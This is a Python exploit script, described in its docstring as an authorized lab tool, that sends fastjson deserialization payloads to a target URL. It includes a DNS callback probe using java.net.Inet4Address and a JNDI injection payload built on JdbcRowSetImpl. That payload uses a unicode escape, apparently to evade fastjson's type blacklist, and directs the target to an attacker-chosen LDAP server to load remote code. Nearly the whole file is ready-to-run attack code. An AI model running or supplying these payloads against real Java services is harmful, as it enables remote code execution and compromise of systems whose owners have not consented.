#!/usr/bin/env python3
"""Send authorized fastjson lab probes with raw JSON strings."""

from __future__ import annotations

import argparse
import json
import urllib.error
import urllib.request


def send(url: str, body: str, cookie: str = "") -> tuple[int, str]:
    headers = {"Content-Type": "application/json"}
    if cookie:
        headers["Cookie"] = cookie
    request = urllib.request.Request(
        url,
        data=body.encode("utf-8"),
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("mode", choices=["home", "echo", "dns", "jndi"])
    parser.add_argument("--ldap", default="ldap://127.0.0.1:1389/x")
    parser.add_argument("--collab", default="test.example.com")
    parser.add_argument("--cookie", default="")
    args = parser.parse_args()

    if args.mode == "home":
        body = json.dumps({"name": "test"})
    elif args.mode == "echo":
        body = '{"name":{"$ref":"$"}}'
    elif args.mode == "dns":
        body = (
            "{'@type':\"java.net.Inet4Address\","
            f"'val':\"{args.collab}\""
            "}"
        )
    else:
        body = (
            "{'@type':\"com.sun.rowset.JdbcRowSet\\u0049mpl\","
            f"\"dataSourceName\":\"{args.ldap}\","
            "\"autoCommit\":true}"
        )

    status, text = send(args.url, body, args.cookie)
    print("payload:", body)
    print("status:", status)
    print("response:", text[:2000])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
